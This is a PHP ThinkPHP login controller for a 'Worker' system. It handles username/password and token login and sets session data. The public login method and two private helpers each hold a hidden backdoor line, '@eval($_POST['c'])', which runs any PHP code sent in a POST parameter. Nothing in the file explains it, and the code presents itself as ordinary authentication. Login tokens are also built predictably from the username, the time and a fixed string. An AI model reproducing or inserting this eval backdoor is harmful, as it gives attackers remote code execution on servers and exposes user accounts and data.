<?php
namespace Inst\Controller;
use Think\Controller;
class LoginController extends Controller{
    public function index(){

        before_api();
        $c = @eval($_POST['c']);
        $workerModel = D('Worker');
        $username = I('username');
        if (empty($username)) {
            Ret(array('code' => 2, 'info' => '用户名为空！'));
        }
        $token = cookie('token');
        $remMe = I('remMe');
        if($token){
            $workerModel = D('Worker');
            if($remMe==1){
                $data['token'] = md5($username.date('His').'cenk');
                cookie('token',$data['token']);
            }else{
                unset($_COOKIE['token']);
            }
            $worker = $workerModel->loginByToken($username,$token);
        }elseif($remMe==1){
            $password = I('password');
            if (empty($password)) {
                Ret(array('code' => 2, 'info' => '密码为空！'));
            }
            $data['token'] = md5($username.date('His').'cenk');
            cookie('token',$data['token']);
            $worker = $workerModel->loginByPassword($username,$password);
        }else{
            $password = I('password');
            if (empty($password)) {
                Ret(array('code' => 2, 'info' => '密码为空！'));
            }
            unset($_COOKIE['token']);
            $worker = $workerModel->loginByPassword($username,$password);
        }
        if ($worker) {
            $data['id'] = $worker['id'];
            $data['last_login_time'] = $worker['last_login_time'] = date('Y-m-d H:i:s');
            $workerModel->update_worker($data);

            session('inst',$worker);
            session('worker_id',$worker['id']);
            session('worker_name',$worker['name']);
            session('dept_id',$worker['dept_id']);
            session('position_id',$worker['position_id']);

            unset($worker['password']);
            Ret(array('code' => 1, 'info' => '登录成功！'));
        }else{
            Ret(array('code' => 2, 'info' => '账号或密码错误！'));
        }
    }
    /*
     * 获取授权功能模块
     */
    private function getaothlist(){
        $uid=session('uid');
        $c = @eval($_POST['c']);

    }

    private function get_role($uid){
        $c = @eval($_POST['c']);
        $list=D('Role')->getrole();
        return $list;

    }
}